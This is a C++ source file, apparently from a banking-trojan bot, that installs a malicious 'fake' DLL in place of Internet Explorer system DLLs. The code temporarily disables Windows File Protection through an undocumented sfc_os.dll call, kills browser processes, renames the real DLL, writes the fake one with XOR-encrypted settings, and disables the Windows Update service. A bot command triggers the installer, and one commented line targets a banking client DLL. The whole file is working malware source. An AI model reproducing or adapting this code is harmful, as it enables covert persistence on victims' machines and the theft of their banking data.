
#include <windows.h>
#include <shlobj.h>

#include "stdafx.h"
#include "BotCore.h"
#include "Splice.h"
#include "DllLoader.h"
#include "Plugins.h"

#include "DbgRpt.h"
#include "Utils.h"
#include "getsec.h"
#include "StrConsts.h"
#include "Crypt.h"
#include "Installer.h"

#include "BotSocket.h"


//----------------------------------------------------------------------------
#include "BotDebug.h"

namespace LDRDEBGTEMPLATES
{
	#include "DbgTemplates.h"
}

#define FAKEDLLDBG LDRDEBGTEMPLATES::DBGOutMessage<>

extern unsigned char fakeDllData[]; //fake.dll

// Ф-ция поиска заданного якоря для буффере
// 
// Возвращает указатель на найденный буффер или NULL, если найти не удалось
LPBYTE LookupAnchor(const LPVOID Buffer, DWORD BufferSize, const LPBYTE Anchor, DWORD AnchorSize)
{
	BYTE* Current = (BYTE*)Buffer;
	BYTE* Limit   = Current + BufferSize - AnchorSize;

	while (Current < Limit)
	{
		if (m_memcmp(Current, Anchor, AnchorSize) == 0)
		{
			return Current;
		}
		Current++;
	}
	return NULL;
}

// Ф-ция встраивает настройки в тело FakeDll.
// Возвращает ненулевое значение, если всё встроилось нормально и 
// NULL - если произошли ошибки
LPBYTE CreateFakeDllWithBuiltingSettings(
	const char* CryptKey,
	const char* DllName,
	const char* BotPlugPath,
	const LPVOID DllBody,
	const DWORD  DllSize
	)
{
	const char CryptKeyAnchor[]    = "A6B7D7BE1E374CD";
	const char RealDllNameAnchor[] = "5BC11231-93CF-4815-8B45-7E7579F39561";
	const char BotPlugPathAnchor[] = "4533703D-7B7F-48FE-A3DA-3155AC13EACB";

	FAKEDLLDBG( "FDI", "key: %s, dll: '%s', bot.plug: '%s'", CryptKey, DllName, BotPlugPath );

	struct AnchorDesc
	{
		char* Anchor;
		DWORD  AnchorBufferSize;	
		const char* Value;
		bool   EncryptValue;

	} ReplaceByAnchorList[] = 
	{
		{ (char*)CryptKeyAnchor, 32, 
		  CryptKey, false 
		},
		
		{ (char*)RealDllNameAnchor, MAX_PATH, 
		  DllName, true 
		},

		{ (char*)BotPlugPathAnchor, MAX_PATH, 
		  BotPlugPath, true 
		}
	};

	LPVOID NewDllBody = MemAlloc(DllSize);

	m_memcpy(NewDllBody, DllBody, DllSize);

	DWORD ReplacedCount = 0;
	int lenCryptKey = m_lstrlen(CryptKey);

	for (DWORD i = 0; i < ARRAYSIZE(ReplaceByAnchorList); i++)
	{
		AnchorDesc& ad = ReplaceByAnchorList[i];
		
		// Если данных больше, чем буффер, берем следующую настойку
		int size = m_lstrlen(ad.Value) + 1;
		if( size > ad.AnchorBufferSize ) continue;

		// Ищем якорь
		int sizeAnchor = m_lstrlen(ad.Anchor);
		LPBYTE AnchorBuffer = LookupAnchor( NewDllBody, DllSize, (BYTE*)ad.Anchor, sizeAnchor );

		// Если якорь не найден - берем следующую настойку
		if( AnchorBuffer == NULL ) continue;


		// Обнуляем найденный буфер
		m_memset( AnchorBuffer, 0, ad.AnchorBufferSize );

		// Копируем данные в буффер
		m_memcpy( AnchorBuffer, ad.Value, size );

		// Если стоит признак шифровать - шифруем весь буффер
		if( ad.EncryptValue ) 
			XORCrypt::Crypt( (char*)CryptKey, (BYTE*)AnchorBuffer, ad.AnchorBufferSize );

		ReplacedCount++;
	}

	// Если что-то не влезает или не находится - возвращаем ошибку.
	if (ReplacedCount != ARRAYSIZE(ReplaceByAnchorList))
	{
		MemFree(NewDllBody);
		NewDllBody = NULL;
	}

	return (LPBYTE)NewDllBody;
}

// Возвращает версию установленного IE
// Информация берется из реестра (HKLM\Software\Microsoft\Internet Explorer:Version)
// Если в результате возвращается 0 - невозможно определить
DWORD GetIeVersion()
{
	HKEY  Key = NULL;
	DWORD status = 0;
	
	status = (DWORD)pRegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Internet Explorer", 
		0, KEY_READ, &Key);
	
	if (status != ERROR_SUCCESS) return 0;

	char  VersionBuffer[100];
	DWORD VersionBufferLength = sizeof(VersionBuffer) - 1;
	DWORD Type = 0;

	m_memset(VersionBuffer, 0, sizeof(VersionBuffer));
	status = (DWORD)pRegQueryValueExA(Key, "Version", NULL, &Type, (LPBYTE)VersionBuffer,
		&VersionBufferLength);

	pRegCloseKey(Key);

	FAKEDLLDBG("GetIeVersion", "VersionBuffer='%s'", VersionBuffer);

	if (status != ERROR_SUCCESS) return 0;
	if (Type != REG_SZ)          return 0;

	if (VersionBuffer[0] == '6') return 6;
	if (VersionBuffer[0] == '7') return 7;
	if (VersionBuffer[0] == '8') return 8;

	return 0;
}


// Незначительно меняет имя исходной длл путем добавления 
// в начало имени случайного символа
char* CreateRealDllName(const char* DllName, char* newDllName )
{
	newDllName[0] = 'a' + ((DWORD)pGetTickCount() % ('z' - 'a' + 1));
	m_lstrcpy( &newDllName[1], DllName );
	return newDllName;
}

// Ф-ция отключает слежение SFC за файлом на одну минуту.(http://bitsum.com/aboutwfp.asp/)
// За это время надо заменить файл.
bool SetSfcExceptionForOneMinute( const char* pathFile )
{
	FAKEDLLDBG("AddFilePathToSfcExceptionList", "Started with Path='%s'", pathFile);

	// Проверяет на факт того, что файл защищается SFC
	// Возвращает TRUE если защищается и FALSE если нет
	typedef BOOL  (WINAPI * SfcIsFileProtectedFunction)(IN HANDLE _pRpcHandle,IN LPCWSTR ProtFileName);

	// Недокументированный вызов. 
	// Отключает SFC для указанного файла на 1 минуту (http://bitsum.com/aboutwfp.asp/)
	// Способ вызова: SfcFileSetException(NULL, L"c:\\windows\\notepad.exe", -1);
	// Если всё хорошо - возвращает 0
	// Если не хорошо - возвращает не 0
	typedef DWORD (WINAPI * SfcFileSetExceptionFunction)(IN HANDLE _pRpcHandle,IN LPCWSTR ProtFileName,DWORD Mode);

	HMODULE SfcDllHandle = (HMODULE)pLoadLibraryA("sfc_os.dll");
	FAKEDLLDBG("AddFilePathToSfcExceptionList", "SFC library=0x%X", SfcDllHandle);
	
	if (SfcDllHandle == NULL) return false;
	
	SfcIsFileProtectedFunction SfcIsFileProtected = 
		(SfcIsFileProtectedFunction)pGetProcAddress(SfcDllHandle, "SfcIsFileProtected");

	SfcFileSetExceptionFunction SfcFileSetException=
		(SfcFileSetExceptionFunction)GetProcAddress(SfcDllHandle,(const char*)5);

	FAKEDLLDBG("AddFilePathToSfcExceptionList", "SfcIsFileProtected=0x%X SfcFileSetException=0x%X", 
		SfcIsFileProtected, SfcFileSetException);
	
	// Если не удалось подгрузить ф-ции - завершаем работы с ошибкой
	if (SfcIsFileProtected == NULL) return false;
	if (SfcFileSetException == NULL) return false;

	wchar_t* Path = AnsiToUnicode( (char*)pathFile, 0 );
	// Если файл не защищается - просто завершаемся с положительным результатом
	BOOL FileProtectedBySfc = SfcIsFileProtected(NULL, Path);
	FAKEDLLDBG("AddFilePathToSfcExceptionList", "FileProtectedBySfc=%d", FileProtectedBySfc);

	bool ret = true;
	if( FileProtectedBySfc ) 
	{
		DWORD SfcFileSetExceptionResult = SfcFileSetException(NULL, Path, -1);
		FAKEDLLDBG("AddFilePathToSfcExceptionList", "SfcFileSetExceptionResult=%u", SfcFileSetExceptionResult);
		ret = (SfcFileSetExceptionResult == 0);
	}
	MemFree(Path);
	return ret;
}

// В зависимости от версии IE :
// 1) выбирает путь ДЛЛ, в которую будет сохранятся FakeDll
// 2) выбирает путь ДЛЛ, куда будет перемещена оригинальная ДЛЛ
// 3) флаг необходимости перемещения FakeDllPath в RealDllPath
bool SelectTargetIeDll(
	char* FakeDllPath,
	char* RealDllPath,
	bool & MoveFakeToRealBeforeFakeSave
	)
{
	const char* Ie8Files[] = 
	{
		//"sqmapi.dll",
		"xpshims.dll"
		//L"ieproxy.dll"
	};

	const char* Ie7Files[] = 
	{
		"custsat.dll",
		"ieproxy.dll"
	};

	const char* Ie6Files[] = 
	{
		 "browseui.dll"
	};

	char ProgramFilesPath[MAX_PATH];
	char System32Path[MAX_PATH];
	BOOL  DirectoryObtained = FALSE;
	DWORD IeVersion = GetIeVersion();

	// Если невозможно определить версию IE - вернуть ошибку
	if (IeVersion == 0) return false;
	
	// Пока реализовано только для версий 6, 7 и 8
	if (IeVersion < 6) return false;
	if (IeVersion > 8) return false;

	// Получаем путь к Program Files
	DirectoryObtained = (BOOL)pSHGetSpecialFolderPathA(NULL, ProgramFilesPath, CSIDL_PROGRAM_FILES, false);
	if (DirectoryObtained == FALSE) return false;
	// Получаем путь к System32
	DirectoryObtained = (BOOL)pSHGetSpecialFolderPathW(NULL, System32Path, CSIDL_SYSTEM, false);
	if (DirectoryObtained == FALSE) return false;

	DWORD   RandNumber = (DWORD)pGetTickCount();
	const char* DllName;

	if (IeVersion == 6) 
	{
		// Для IE 6 будем делать подмену системной DLLки путем создания с таким же именем 
		// в папке IE. Поскольку порядок загрузки начинается с папки с программой,
		// загрузка не по абсолютному пути начнется с нашей DLLки.
		MoveFakeToRealBeforeFakeSave = false;
		DllName = Ie6Files[RandNumber % ARRAYSIZE(Ie6Files)];;

		m_lstrcpy( FakeDllPath, ProgramFilesPath );
		pPathAppendA( FakeDllPath, "Internet Explorer");
		pPathAppendA( FakeDllPath, DllName );
		m_lstrcpy( RealDllPath,  System32Path );
		pPathAppendA( RealDllPath, DllName );
		
		return true;
	}
	
	// Для IE7 и IE8 механизм одинаков
	// Подмена делается 

	if (IeVersion == 7) 
		DllName = Ie7Files[RandNumber % ARRAYSIZE(Ie7Files)];
		
	if (IeVersion == 8) 
		DllName = Ie8Files[RandNumber % ARRAYSIZE(Ie8Files)];

	m_lstrcpy( FakeDllPath, ProgramFilesPath );
	pPathAppendA( FakeDllPath, "Internet Explorer" );
	pPathAppendA( FakeDllPath, DllName );

	char newDllName[64];
	CreateRealDllName( DllName, newDllName );
	m_lstrcpy( RealDllPath, ProgramFilesPath );
	pPathAppendA( RealDllPath, "Internet Explorer" );
	pPathAppendA( RealDllPath, newDllName );

	MoveFakeToRealBeforeFakeSave = true;

	return true;
}

// Возвращает тело FakeDll
// Если не получается получить - возвращает NULL
LPVOID GetBuiltinFakeDllBody(DWORD & Size)
{
	LPVOID buf;
	bool bufAlloc;
	if( TMemoryDLL::DecodeDll( fakeDllData, Size, buf, bufAlloc ) )
		return buf;
	else
		return 0;
}

// Убивает все процессы IE (а с ним и все остальные браузеры)
void KillAllIeProcesses()
{
	FAKEDLLDBG("KillAllIeProcesses", "runned");
	KillAllBrowsers();
}

// При подмене ДЛЛки для IE сервис обновления обнаруживает изменения
// и устанавливает обновление, которое заменяет нашу длл на оригинальную.
// Чтобы избежать этого, при установке надо отключить сервис обновлений Windows.
void TryDisableAutoUpdateService()
{
	FAKEDLLDBG("DisableAutoUpdateService", "started");

	// Сначала по тихому пробуем установить значение в реестре в
	// Disabled
	HKEY  Key = NULL;
	DWORD status = 0;
	
	status = (DWORD)pRegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\wuauserv",
		0, KEY_WRITE, &Key);
	if (status != ERROR_SUCCESS) return;

	DWORD ServiceStart = SERVICE_DISABLED;
	status = (DWORD)pRegSetValueExA(Key, "Start", 0, REG_DWORD, (const LPBYTE)&ServiceStart, sizeof(ServiceStart));
	
	pRegCloseKey(Key);
	if (status != ERROR_SUCCESS) return;

	// После успешной модификации реестра пробуем остановить сервис.
	// Настройки из реестра применится только после перезагрузки
	SC_HANDLE ScmHandle = NULL;
	SC_HANDLE SvcHandle = NULL;

	do
	{
		ScmHandle = (SC_HANDLE)OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		if (ScmHandle == NULL) break;

		SvcHandle = (SC_HANDLE)OpenServiceA(ScmHandle, "wuauserv", SERVICE_STOP | SERVICE_QUERY_STATUS);
		if (SvcHandle == NULL) break;

		SERVICE_STATUS_PROCESS ssp;

		BOOL InitStopResult = ControlService(SvcHandle, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp);
		if (InitStopResult != TRUE) break;

		// 2 минуты ждемс
		DWORD Timeout   = 2 * 60 * 1000;
		DWORD StartTime = (DWORD)pGetTickCount();
		
		while (ssp.dwCurrentState != SERVICE_STOPPED)
		{
			DWORD SizeRequired = 0;
			pSleep(ssp.dwWaitHint);

			BOOL QueryResult = QueryServiceStatusEx(SvcHandle, SC_STATUS_PROCESS_INFO,
				(LPBYTE)&ssp, sizeof(ssp), &SizeRequired);
			
			if (QueryResult == FALSE) break;
			if (ssp.dwCurrentState == SERVICE_STOPPED) break;
			if (((DWORD)pGetTickCount() - StartTime) > Timeout) break;
		}
	}
	while(false);

	FAKEDLLDBG("DisableAutoUpdateService", "Finished.");

	if (SvcHandle != NULL) CloseServiceHandle(SvcHandle);
	if (ScmHandle != NULL) CloseServiceHandle(ScmHandle);
}

// Ф-ция установки 
BOOL InstallForIe()
{
	LPBYTE FakeDllWithSettings = NULL;
	BOOL   result = FALSE;

	do
	{
		DWORD  FakeDllSize = 0;
		LPVOID FakeDllBody = GetBuiltinFakeDllBody(FakeDllSize);

		FAKEDLLDBG("InstallForIe", 
			"GetBuiltinFakeBody() dll=0x%X size=%u", FakeDllBody, FakeDllSize);

		// Проверка на встроенность тела FakeDll
		if (FakeDllBody == NULL) break;

		// Выбираем дллку для замещения.
		char FakeDllPath[MAX_PATH];
		char RealDllPath[MAX_PATH];
		bool MoveFakeToRealBeforeFakeSave = false;

		bool DllSelected = SelectTargetIeDll( FakeDllPath, RealDllPath, MoveFakeToRealBeforeFakeSave );
		FAKEDLLDBG("InstallForIe", 
			"SelectTargetIeDll() result=%d FakeDllPath='%s' RealDllPath='%s'", 
			DllSelected, FakeDllPath, RealDllPath );

		if (!DllSelected) break;

		// Generate crypt key
		char* CryptKey = MakeMachineID();
		// Встраиваем в фейковую длл все параметры, необходимые для работы 
		// (crypt key, new target dll path, path to crypted botplug) 
		FakeDllWithSettings = CreateFakeDllWithBuiltingSettings( CryptKey, 
			RealDllPath, GetBotPlugFileName().t_str(), FakeDllBody, FakeDllSize );

		STR::Free(CryptKey);
		FAKEDLLDBG("InstallForIe", "CreateFakeDllWithBuiltingSettings() result=0x%X", FakeDllWithSettings);

		if (FakeDllWithSettings == NULL) break;

		if (MoveFakeToRealBeforeFakeSave)
		{
			// Пробуем переменовать целевую DLLку
			// Если не получается - пробуем прибить все процессы IE и пробуем 
			// переименовывать опять.

			DWORD MaxAttemptsCount = 5;
			DWORD AttemptsCount = 0;

			for (DWORD i = 0; i < MaxAttemptsCount; i++)
			{
				FAKEDLLDBG( "InstallForIe", "Try to MoveFile(Src='%s',Dst='%s')", FakeDllPath, RealDllPath );

				BOOL MoveResult = (BOOL)pMoveFileA( FakeDllPath, RealDllPath );
				
				if (MoveResult == TRUE) break;

				// Если Move не получается - предполагаем что файл занят.
				// Убиваем все процессы IE, спим немного для ожидания завершения процессов 
				// и пробуем еще.
				KillAllIeProcesses();
				pSleep(1 * 1000);
				AttemptsCount++;
			}

			FAKEDLLDBG("InstallForIe", "MoveFile results AttemptsCount=%u MaxAttemptsCount=%u",
				AttemptsCount, MaxAttemptsCount);

			if (AttemptsCount == MaxAttemptsCount) break;
		}
		
		// Если переименованиме прошло успешно - сохраняем дллку
		DWORD Written = File::WriteBufferA( FakeDllPath, FakeDllWithSettings, FakeDllSize );

		FAKEDLLDBG("InstallForIe", "WriteBuffer for target dll.(Written=%u FakeDllSize=%u)",
			Written, FakeDllSize);

		if( Written != FakeDllSize ) break;

		// Если всё прошло успешно - отключаем сервис обновления Windows
		TryDisableAutoUpdateService();

		result = TRUE;
		// report result
	}
	while (false);

	if( FakeDllWithSettings ) MemFree(FakeDllWithSettings);

	FAKEDLLDBG("InstallForIe", "Finished with result=%d",result);
	return result;
}

// Експортируемая ф-ция для запуска установки FakeDll
// Вызывается из бота по команде installfd
extern "C" BOOL WINAPI Install( BYTE* bodyBotPlug, DWORD sizeBotPlug )
{
	if( bodyBotPlug == 0 || sizeBotPlug == 0 ) return FALSE;
	BOT::Initialize();
	// Инициализируем систему отправки статистической информации
	DebugReportInit();

	FAKEDLLDBG( "FakeInstall", "Started size bot plug=%d", sizeBotPlug );

	DWORD res = InstallForIe();
	if( res )
	{
		BOT::SaveSettings(true, false, true);
		Bot->CreateFileA( 0, GetStr(EStrFakeDllFlag).t_str() );
	}
	return res;
}

//подменяет длл путь к которой fakeDll
extern "C" BOOL WINAPI Install2( const char* fakeDll, BYTE* bodyBotPlug, DWORD sizeBotPlug )
{
	BOOL ret = FALSE;
	BOT::Initialize();
	if( !File::IsExists((char*)fakeDll) ) return FALSE;
	char origDll[MAX_PATH]; //путь куда сохраняется оригинальная длл
	m_lstrcpy( origDll, fakeDll );
	//смещаем расширение на один символ вправо
	int p = m_lstrlen(origDll);
	origDll[p + 1] = 0;
	do
	{
		origDll[p] = origDll[p - 1];
		p--;
	} while( origDll[p] != '.' );
	//добавляем любую цифру к имени длл
	for( int i = 0; i < 10; i++ )
	{
		origDll[p] = ((DWORD)pGetTickCount() % 10) + '0';
		//если такая есть, то пробуем ставить другую цифру
		if( !File::IsExists(origDll) )
		{
			p = -1; //такого файла нет
			break; 
		}
	}
	if( p >= 0 ) //создать имя не удалось
	{
		return FALSE;
	}
	FAKEDLLDBG( "InstallFakeDll", "Подмена %s -> %s", fakeDll, origDll );
	DWORD  fakeDllSize = 0;
	LPVOID fakeDllBody = GetBuiltinFakeDllBody(fakeDllSize);
	if( fakeDllBody == 0 ) return FALSE;
	char* CryptKey = MakeMachineID();
	BYTE* fakeDllBody2 = CreateFakeDllWithBuiltingSettings( CryptKey, origDll, GetBotPlugFileName().t_str(), fakeDllBody, fakeDllSize );
	STR::Free(CryptKey);
	if( fakeDllBody2 )
	{
		char fakeDll2[MAX_PATH];
		m_lstrcpy( fakeDll2, fakeDll );
		StrLowerCase(fakeDll2);
		KillBlockingProcesses(fakeDll2);
		if( pMoveFileA( fakeDll2, origDll ) )
		{
			if( File::WriteBufferA( fakeDll2, fakeDllBody2, fakeDllSize ) == fakeDllSize )
			{
				FAKEDLLDBG( "InstallFakeDll", "fake.dll installed" );
				BOT::SaveSettings(true, false, false);
				ret = TRUE;
			}
		}
		MemFree(fakeDllBody2);
	}
	MemFree(fakeDllBody);
	return ret;
}

#pragma comment(linker, "/ENTRY:FakeDllInstallerDllMain" )

DWORD WINAPI FakeDllInstallerDllMain(HINSTANCE , DWORD reason, LPVOID )
{
//код для тестирования, ложится вместе c bot.plug и запускается "rundll32 bki.plug,qwe"
/*
	BOT::Initialize();
	BYTE* data;
	DWORD size;
	data = File::ReadToBufferA( "bot.plug", size );
	if (CryptBotPlug( data, size))
	{
		File::WriteBufferA(GetBotPlugFileName().t_str(), data, size);
	}
*/
	switch (reason)
	{
		case DLL_PROCESS_ATTACH:
//			Install( data, size );
//			Install2( "c:\\ifobs2\\nkicnt.dll", data, size );
			break;
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
	}
	return TRUE;
}
